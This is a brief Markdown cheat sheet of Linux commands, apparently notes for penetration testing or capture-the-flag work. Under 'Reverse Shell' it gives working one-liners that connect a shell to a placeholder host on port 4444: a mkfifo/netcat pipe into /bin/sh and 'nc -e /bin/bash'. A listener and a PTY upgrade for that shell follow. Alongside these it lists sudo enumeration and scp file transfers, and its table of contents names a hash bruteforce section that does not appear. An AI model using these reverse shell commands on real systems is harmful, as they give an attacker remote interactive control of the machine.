# Linux

- [Sudo](#sudo)
- [Reverse Shell](#reverse-shell)
- [Hash Bruteforce](#hash-bruteforce)
- [SCP](#scp)
- [Editor](#editor)


## Sudo
```
sudo -l
```

## Reverse Shell

### mkfifo

```
mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

### Client
```
nc ip 4444 -e /bin/bash
```
### Server
```
nc -lp 4444
```
### TTY Support
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## SCP
### Download File
```
scp -P port user@192.168.1.ip:path .
```

### Upload File
```
scp -P port file user@192.168.1.ip:path
```

### Upload peda
```
scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
```

## Editor
### Hexa
```
hexedit
```
